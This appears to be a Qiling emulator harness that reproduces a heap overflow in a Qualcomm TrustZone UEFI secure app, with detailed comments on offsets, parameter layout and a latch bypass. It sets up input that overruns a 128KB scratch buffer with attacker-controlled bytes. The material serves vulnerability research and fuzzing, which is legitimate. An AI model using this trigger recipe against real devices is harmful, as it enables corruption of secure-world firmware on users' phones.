from .params import *
from qiling import Qiling
import struct, os

# === NEW BUG: uefi_sec GP cmd1 (SetVariable) unclamped CopyMem into 128KB scratch
# === (QUEFI-NEW-1) ==========================================================
# Target: qcom.tz.uefisecapp (SM-S928B). Reachable from a PLAIN GP InvokeCommand
# (cmd 1) -- NOT the PKCS#7/SCM path -- and BYPASSES the EfiAtRuntime lockdown
# latch (only svc_uefi_var_entry consults it; the GP handlers call the
# ScmCmdProcess* leaves directly).
#
# GP invoke handler @0x528, ABI (x0=session, w1=cmd, x2=TEE_Param[4], w3=ptypes).
# cmd1 -> handler @0x6c4 (jump table @0x177f8: 0x57c + table[1]=0x52<<2 = 0x6c4).
# Param layout it reads (TEE_Param[4] = 4x {ptr(8), size(8)}):
#   param0.buf=[x2+0x00] size=[x2+0x08]==0x18   (the "header": GUID + lengths)
#   param1.buf=[x2+0x10] size=[x2+0x18]          (the variable NAME, UCS-2)
#   param2.buf=[x2+0x20] size=[x2+0x28]          (the variable DATA)
# Sinks (dest = scratch = qsee_malloc(0x20000) = 128KB, asan-redzoned):
#   0x720 StrSize(param1.buf)            ; UCS-2 strlen, UNBOUNDED
#   0x754 CopyMem(scratch+0x24, NAME, StrSize)        ; *** NO clamp vs 0x20000 ***
#   0x764 CopyMem(scratch+off, param0.buf, 0x10)      ; fixed GUID (benign)
#   0x768 w2 = [scratch+0x20] = param0.buf[0x14] = DATA length (raw u32)
#   0x77c CopyMem(scratch+off, param2.buf, DATA_len)  ; *** NO clamp vs 0x20000 ***
# ScmCmdProcessSetVariable@0x3970 runs AFTER both copies (@0x7a0), so its internal
# UefiValidateAddress cannot prevent the overflow.
#
# We reproduce QUEFI-NEW-1 via the DATA sink (0x77c): set param0.buf[0x14] (the u32
# at +0x14) huge (> 0x20000 - data_off) and point param2 at a large buffer; the
# CopyMem then overruns the 128KB scratch heap chunk -> asan redzone -> CRASH_PC.
# (The NAME sink @0x754 is the same bug via an un-terminated >128KB UCS-2 name.)

AFL_EXIT = 0x13370
CMD_SETVAR = 1

# param0 ("header"): 0x18 bytes. Layout consumed: [0x10]=w24 (attrs?), [0x14]=DATA len.
P0_BASE   = 0x51000000
P0_SIZE   = 0x1000
# param1 (NAME, UCS-2): keep it short+terminated so the NAME copy is small and the
# DATA sink is the one that overflows (isolate the sink under test).
P1_BASE   = 0x51100000
P1_SIZE   = 0x1000
# param2 (DATA): must be >= DATA_len so the READ stays mapped while the WRITE
# overflows the 128KB scratch. Map it large.
P2_BASE   = 0x52000000
P2_SIZE   = 0x40000        # 256KB: room for a DATA_len up to ~0x3FFF0 read source

# DATA length default: just over the scratch capacity minus the data offset. The
# data is written at scratch + [scratch+0x1c]; [scratch+0x1c] = StrSize(name)+0x24
# (small here), so ~0x20000 bytes of DATA overflow the 0x20000 chunk. Use 0x20100.
DEF_DATALEN = int(os.environ.get("UEFI_DATALEN", str(0x20100)), 0) & 0xFFFFFFFF


SCRATCH_USER = 0x55000000      # the 128KB scratch user pointer (we redzone it)
SCRATCH_CAP  = 0x20000         # = the real qsee_malloc(0x20000) capacity

def init_fuzz(emu, sid):
    ql = emu.ql
    for base, size, name in ((P0_BASE, P0_SIZE, "p0_hdr"),
                             (P1_BASE, P1_SIZE, "p1_name"),
                             (P2_BASE, P2_SIZE, "p2_data")):
        try:
            ql.mem.map(base, size, info=f"[uefi_gp] {name}")
        except Exception as e:
            ql.log.warning(f"[uefi_gp] map {name} @ {hex(base)}: {e}")

    # The cmd1 handler reads the 128KB scratch pointer from *(0x1e160), which is
    # set ONLY by CUEFISecApp_open@0x4d4 via qsee_malloc(0x20000). We stub the GP
    # lifecycle (so CUEFISecApp_open doesn't run), so we ALLOCATE the scratch here
    # exactly as malloc_core does -- a 0x20000 user region with asan redzones
    # before/after -- and store its user pointer at *(0x1e160). This makes the
    # handler's unclamped CopyMem land on a REAL asan-redzoned heap chunk, so the
    # OOB write past 0x20000 trips CRASH_PC (the same detection as a real
    # qsee_malloc chunk).
    RZ = asan.ASAN_REDZONE_SIZE
    total = ((SCRATCH_CAP + 2 * RZ + 0xFFF) & ~0xFFF)
    region = SCRATCH_USER - RZ
    try:
        ql.mem.map(region & ~0xFFF, total + 0x2000, info="[uefi_gp] scratch_chunk")
    except Exception as e:
        ql.log.warning(f"[uefi_gp] scratch map: {e}")
    user = SCRATCH_USER
    # before-redzone [region, user) and after-redzone [user+cap, ...)
    asan.asan_hook_redzone_mem_rw(region, RZ, ql)
    emu.HEAP["redzones"][region] = RZ
    after = user + SCRATCH_CAP
    after_sz = (region + total) - after
    asan.asan_hook_redzone_mem_rw(after, after_sz, ql)
    emu.HEAP["redzones"][after] = after_sz
    emu.HEAP["allocated"][user] = SCRATCH_CAP
    # The handler reads x8 = *(ta_base+0x1e160) [a RELATIVE reloc -> ta_base+0x26008,
    # a RW global struct], then scratch = [x8] = [ta_base+0x26008]. CUEFISecApp_open
    # stored the qsee_malloc result there. So write OUR scratch ptr to the struct's
    # first field at ta_base+0x26008 (NOT directly to 0x1e160).
    base = ql.mem.get_lib_base("uefi_sec.ta")
    ql.mem.write_ptr(base + 0x26008, user)
    print(f"[uefi_gp] init: p0@{hex(P0_BASE)} p1@{hex(P1_BASE)} p2@{hex(P2_BASE)} "
          f"scratch@{hex(user)} cap={hex(SCRATCH_CAP)} after_rz@{hex(after)} "
          f"(*(0x1e160)<-{hex(user)})")


def place_input_callback(ql: Qiling, input: bytes, _: int):
    # AFL drives DATA_len from input[0:4] across the full u32 range so the 0x20000
    # scratch-overflow boundary is DISCOVERED (small -> safe; large -> overflow).
    data_len = DEF_DATALEN
    if "UEFI_DATALEN" not in os.environ:
        data_len = (struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0)
        # cap so the param2 READ stays inside its 256KB map (we want the WRITE
        # overflow on the scratch heap, not a read fault on param2).
        data_len = data_len % (P2_SIZE + 1)

    # re-assert the scratch pointer in the global struct each invoke (defensive;
    # the RW global is restored from the image between runs).
    base = ql.mem.get_lib_base("uefi_sec.ta")
    ql.mem.write_ptr(base + 0x26008, SCRATCH_USER)

    # param0 header: zero, then stamp DATA length at +0x14 (the field the handler
    # reads into w23 at 0x6fc). +0x10 (w24) left 0.
    hdr = bytearray(0x18)
    struct.pack_into("<I", hdr, 0x14, data_len & 0xFFFFFFFF)
    ql.mem.write(P0_BASE, bytes(hdr) + b"\x00" * (P0_SIZE - 0x18))
    # param1 NAME: short terminated UCS-2 ("A\0\0\0") so the NAME copy is tiny.
    ql.mem.write(P1_BASE, b"A\x00\x00\x00" + b"\x00" * (P1_SIZE - 4))
    # param2 DATA: fill with a marker so the copied bytes are attacker-controlled.
    ql.mem.write(P2_BASE, b"\x43" * P2_SIZE)

    # Build TEE_Param[4]: param0(size 0x18), param1(name), param2(data). Use plain
    # page maps (no redzone) for param buffers so the only redzone in play is the
    # scratch heap chunk -- we want to observe THAT overflow, not a param-buf one.
    setup_params_fuzz(ql, CMD_SETVAR, 3,
                      [NoneParam(), NoneParam(), NoneParam(), NoneParam()])
    # setup_params_fuzz set x0..x3 and mapped an empty params array. We point the
    # 4 param slots at OUR own pages (no redzone) so the only redzone in play is
    # the scratch heap chunk -- we want to observe THAT overflow, not a param one.
    params_ptr = ql.arch.regs.x3
    # rewrite the 4 param slots: {ptr,size} each (8+8)
    ql.mem.write_ptr(params_ptr + 0x00, P0_BASE); ql.mem.write_ptr(params_ptr + 0x08, 0x18)
    ql.mem.write_ptr(params_ptr + 0x10, P1_BASE); ql.mem.write_ptr(params_ptr + 0x18, 0x800)
    ql.mem.write_ptr(params_ptr + 0x20, P2_BASE); ql.mem.write_ptr(params_ptr + 0x28, max(data_len, 1))

    # GP invoke handler ABI: x0=session(any), w1=cmd, x2=params, w3=ptypes
    ql.arch.regs.x0 = 0xbbbbb000
    ql.arch.regs.x1 = CMD_SETVAR
    ql.arch.regs.x2 = params_ptr
    ql.arch.regs.x3 = 3
    ql.arch.regs.x30 = AFL_EXIT

    print(f"[uefi_gp] GP cmd1 SetVariable DATA_len={data_len:#x} "
          f"-> CopyMem(scratch[0x20000], param2, {data_len:#x}) "
          f"(overflow if > ~0x20000)")
    return True
